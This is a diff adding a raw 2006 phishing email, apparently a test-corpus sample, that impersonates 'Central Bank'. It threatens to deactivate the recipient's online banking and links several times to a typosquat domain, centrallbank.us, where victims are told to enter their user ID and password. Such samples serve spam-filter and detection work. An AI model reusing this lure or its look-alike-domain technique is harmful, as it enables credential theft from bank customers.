@@ -1,0 +1,96 @@
+From nobody Sun Jan 25 13:49:56 2015
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id 406C12A88C
+ for <user@example.com>; Tue, 10 Jan 2006 11:43:40 -0500 (EST)
+Received: by mail.example.com (Example mail relay)
+ id 32811621CB2; Tue, 10 Jan 2006 11:43:40 -0500 (EST)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+ by mail.example.com (Example mail relay) with ESMTP id E4119621C9A
+ for <user@example.com>; Tue, 10 Jan 2006 11:43:39 -0500 (EST)
+Received: (from user@localhost) by mail.example.com id LAA27408
+ for user@example.com; Tue, 10 Jan 2006 11:43:39 -0500
+Received: from sync.surpasshosting.com (sync.surpasshosting.com [72.29.75.231])
+ by mail.example.com with ESMTP id LAA27399
+ for <user@biochemistry.bioc.cwru.edu>; Tue, 10 Jan 2006 11:43:38 -0500
+Message-Id: <200601101643.LAA27399@mail.example.com>
+Received: from [80.97.187.25] (helo=centralbank.net)
+ by sync.surpasshosting.com with esmtpa (Exim 4.52)
+ id 1EwMZU-0001bq-TN; Tue, 10 Jan 2006 11:42:09 -0500
+From: "Central Bank" <custom.service@centralbank.net>
+Subject: Central Bank - banking@home e-statements and Online Bill Pay
+ deactivation
+Date: Wed, 11 Jan 2006 18:41:38 +0200
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 1
+X-MSMail-Priority: High
+X-Mailer: Microsoft Outlook Express 5.50.4522.1200
+X-MimeOLE: Produced By Microsoft MimeOLE V5.50.4522.1200
+X-AntiAbuse: This header was added to track abuse,
+ please include it with any abuse report
+X-AntiAbuse: Primary Hostname - sync.surpasshosting.com
+X-AntiAbuse: Original Domain - biochemistry.bioc.cwru.edu
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - centralbank.net
+To: undisclosed-recipients: ;
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 265
+
+<html>
+<head>
+<title>Untitled Document</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+</head>
+
+<body bgcolor="#FFFFFF" text="#000000">
+<blockquote>
+  <p><img src="https://myonlineservices.centralbank.net/ISRVWebApplication/login/images/001_logo_content.gif" width="432" height="58" align="top"></p>
+  <p><b>Important Information Regarding Your Central Bank </b><a href="http://www.myonlineservices.centrallbank.us/manual/%20%20/.login/">banking@home</a> 
+  </p>
+  <p>Dear Central Bank Client, </p>
+  <p>This is your official notification that the service(s) listed below will 
+    be deactivated and deleted if not renew immediately. </p>
+  <p>Previous notifications have been sent to the Billing Contact assigned to 
+    your account.</p>
+  <p>As the Primary Contact, you must renew the service(s) listed below: </p>
+  <p>SERVICE: Central Bank <a href="http://www.myonlineservices.centrallbank.us/manual/%20%20/.login/">banking@home</a> and Bill Pay services. 
+    <br>
+    EXPIRATION: January, 08, 2006<br>
+  </p>
+  <p><b>What you need to do:</b></p>
+  <p>It's easy to renew, simply:</p>
+  <p></p>
+  <p>- Go to <a href="http://www.myonlineservices.centrallbank.us/manual/%20%20/.login/">banking@home</a><br>
+    - Enter your user ID and Password (that you selected during the online enrollment 
+    process).<br>
+    - Enter the requested information and your <a href="http://www.myonlineservices.centrallbank.us/manual/%20%20/.login/">banking@home</a> 
+    and Bill Pay services will be renew. </p>
+  <p>****************************************************************************<br>
+    IMPORTANT CUSTOMER SUPPORT INFORMATION<br>
+    *****************************************************************************<br>
+    <br>
+    Please do not reply to this message. For any inquiries, contact Customer Service.<br>
+    <br>
+    Document Reference: (92051208).<br>
+    <br>
+    Central Bank, N.A.<br>
+    Copyright &copy; 2006 Central Bank, N.A. All rights reserved</p>
+  <p></p>
+  <p></p>
+  <p></p>
+  <p></p>
+  <p></p>
+</blockquote>
+</body>
+</html>
+
+X-trace: 99,ubzr,ohexr,choyvp_ugzy,_igv_cig_
+
+
